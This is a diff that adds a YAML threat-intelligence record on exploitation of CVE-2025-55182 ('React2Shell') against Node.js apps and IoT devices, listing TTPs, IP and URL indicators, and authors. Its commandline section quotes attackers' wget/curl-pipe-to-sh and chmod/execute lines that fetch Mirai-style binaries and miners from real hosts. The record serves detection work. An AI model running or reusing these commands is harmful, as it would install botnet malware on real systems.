@@ -1,0 +1,74 @@
+description: Exploitation attempts of CVE-2025-55182, known as React2Shell, targeting
+  Node.js applications and IoT devices.
+malware_families:
+- Mirai-style binaries
+- cryptocurrency miner
+TTPs:
+  processes:
+  - wget
+  - curl
+  - BusyBox
+  - chmod
+  - sh
+  commandline:
+  - wget http://193.34.213.150/nuts/x86 -O-x
+  - curl http://172.237.55.180/c -D-|sh
+  - BusyBox wget -q http://193.34.213.150/nuts/bolts -O-
+  - chmod 777 x86
+  - ./x86 reactOnMynuts
+  - wget http://41.231.37.153/rondo.aqu.sh
+  - curl -g0- http://41.231.37.153/rondo.aqu.sh|sh
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - wget->193.34.213.150
+  - curl->172.237.55.180
+  - BusyBox wget->193.34.213.150
+  - chmod->localhost
+  - ./x86 reactOnMynuts->localhost
+  - wget->41.231.37.153
+  - curl->41.231.37.153
+  file_activity:
+  - x86
+  - bolts
+  - rondo.aqu.sh
+  - /nuts/x86
+  - /nuts/bolts
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 193.34.213.150
+  - 41.231.37.153
+  - 89.144.31.18
+  - 31.56.27.76
+  - 172.237.55.180
+  - gfxnick.emerald.usbx.me
+  - 23.228.188.126
+  - 176.117.107.154
+  - 23.132.164.54
+  domains: []
+  urls:
+  - http://193.34.213.150/nuts/x86
+  - http://193.34.213.150/nuts/bolts
+  - http://89.144.31.18/nuts/x86
+  - http://89.144.31.18/nuts/bolts
+  - http://31.56.27.76/n2/x86
+  - http://172.237.55.180/c
+  - http://gfxnick.emerald.usbx.me/both
+  - http://41.231.37.153/rondo.aqu.sh
+  - http://23.228.188.126/rondo.aqu.sh
+  - http://176.117.107.154/both
+  - http://23.132.164.54/both
+  - https://f003.backblazeb2.com/file/mova12/98201-1-8/bot
+authors:
+- Paul Satmarean
+- Ioan Alexandru MELNICIUC
+reference: https://www.bitdefender.com/en-us/blog/labs/cve-2025-55182-exploitation-hits-the-smart-home
+date_of_publication: December 10, 2025
+file_creation_date: December 10, 2025
